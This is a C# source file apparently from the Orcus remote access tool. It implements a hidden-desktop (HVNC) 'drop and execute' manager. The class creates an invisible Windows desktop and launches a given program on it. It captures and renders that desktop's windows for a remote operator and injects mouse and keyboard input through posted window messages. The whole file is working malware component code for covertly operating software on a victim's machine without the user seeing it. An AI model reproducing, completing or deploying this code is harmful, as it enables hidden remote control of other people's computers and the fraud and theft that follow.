using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Orcus.Commands.HVNC;
using Orcus.Native;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Utilities.WindowsDesktop;
using WindowUpdate = Orcus.Shared.Commands.DropAndExecute.WindowUpdate;

namespace Orcus.Commands.DropAndExecute
{
    public class HiddenDesktopApplicationManager : IApplicationWarder
    {
        private readonly List<RenderWindow> _renderWindows;

        public HiddenDesktopApplicationManager()
        {
            Desktop = new Desktop();
            Desktop.Create(Guid.NewGuid().ToString("N"));
            _renderWindows = new List<RenderWindow>();
        }

        public void Dispose()
        {
            foreach (var renderWindow in _renderWindows)
                renderWindow.Dispose();
        }

        public Desktop Desktop { get; }

        public void StopExecution()
        {
            Desktop.SetCurrent(Desktop);
            foreach (var renderWindow in _renderWindows)
                NativeMethods.PostMessage(new HandleRef(null, renderWindow.Handle), WM.CLOSE, IntPtr.Zero, IntPtr.Zero);

            if (Process != null)
            {
                try
                {
                    Process.Kill();
                }
                catch (Exception)
                {
                    // ignored
                }

                Process.Dispose();
                Process = null;
            }

            Desktop?.Dispose();
        }

        public Process Process { get; set; }

        public void OpenApplication(string path, string arguments, bool runAsAdministrator)
        {
            Desktop.SetCurrent(Desktop);
            Process = Desktop.CreateProcess(path, arguments);
            if (Process == null)
                throw new InvalidOperationException("Process is null");
        }

        public WindowUpdate GetWindowUpdate(long windowHandle, out IDataInfo windowRenderData)
        {
            Desktop.SetCurrent(Desktop);

            List<Window> windows;
            try
            {
                //get all windows
                windows = Desktop.GetWindows().Where(x => NativeMethods.IsWindowVisible(x.Handle)).ToList();
            }
            catch (Exception)
            {
                windowRenderData = null;
                return null;
            }

            var windowUpdate = new WindowUpdate {AllWindows = windows.Select(x => x.Handle.ToInt64()).ToList()};

            const int maxWindowNameLength = 100;
            var ptr = Marshal.AllocHGlobal(maxWindowNameLength);
            try
            {
                foreach (var window in windows)
                {
                    RECT rect;
                    NativeMethods.GetWindowRect(window.Handle, out rect);
                    NativeMethods.GetWindowText(window.Handle, ptr, maxWindowNameLength);

                    var windowInformation = new WindowInformation
                    {
                        Handle = (int) window.Handle,
                        Height = rect.Height,
                        Width = rect.Width,
                        X = rect.X,
                        Y = rect.Y,
                        Title = Marshal.PtrToStringAnsi(ptr)
                    };

                    var existingRenderWindow =
                        _renderWindows.FirstOrDefault(x => x.WindowInformation.Handle == window.Handle.ToInt64());

                    if (existingRenderWindow == null)
                    {
                        windowUpdate.NewWindows.Add(windowInformation);
                        _renderWindows.Add(new RenderWindow(windowInformation, window.Handle));
                    }
                    else
                    {
                        if (existingRenderWindow.WindowInformation.Equals(windowInformation))
                            continue;

                        windowUpdate.UpdatedWindows.Add(windowInformation);
                        existingRenderWindow.ApplyWindowInformation(windowInformation);
                    }
                }
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            var windowToRender = _renderWindows.FirstOrDefault(x => x.Handle.ToInt64() == windowHandle) ??
                                 _renderWindows.FirstOrDefault();

            //in case that _renderWindows is empty
            if (windowToRender != null)
            {
                windowRenderData = windowToRender.Render();
                windowUpdate.RenderedWindowHandle = windowToRender.Handle.ToInt64();
            }
            else
                windowRenderData = null;

            return windowUpdate;
        }

        public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extra, long windowHandle)
        {
            Desktop.SetCurrent(Desktop);
            Desktop.DesktopActions.DoMouseAction(mouseAction, x, y, extra, windowHandle);
        }

        //https://stackoverflow.com/questions/11890972/simulating-key-press-with-postmessage-only-works-in-some-applications
        public void DoKeyboardAction(RemoteDesktopKeyboardAction keyboardAction, short scanCode, long windowHandle)
        {
            Desktop.SetCurrent(Desktop);

            var guidThreadInfo = new GUITHREADINFO();
            guidThreadInfo.cbSize = Marshal.SizeOf(guidThreadInfo);

            var currentWindow = new IntPtr(windowHandle);

           var threadId = NativeMethods.GetWindowThreadProcessId(currentWindow, IntPtr.Zero);
            var result = NativeMethods.GetGUIThreadInfo(threadId, ref guidThreadInfo);
            if (!result)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            currentWindow = guidThreadInfo.hwndFocus;

            var virtualKeyCode = NativeMethods.MapVirtualKey((uint) scanCode, MapVirtualKeyMapTypes.MAPVK_VSC_TO_VK);

            //https://msdn.microsoft.com/en-us/library/ms646280(VS.85).aspx#CodeSnippetContainerCode0
            var lparam = scanCode >> 16;

            switch (keyboardAction)
            {
                case RemoteDesktopKeyboardAction.KeyDown:
                    NativeMethods.PostMessage(new HandleRef(null, currentWindow), WM.KEYDOWN, new IntPtr(virtualKeyCode),
                        new IntPtr(lparam));
                    break;
                case RemoteDesktopKeyboardAction.KeyUp:
                    //that makes every key doubled
                    //NativeMethods.PostMessage(new HandleRef(null, currentWindow), WM.KEYUP, new IntPtr(virtualKeyCode),
                    //    new IntPtr(lparam));
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(keyboardAction), keyboardAction, null);
            }
        }
    }
}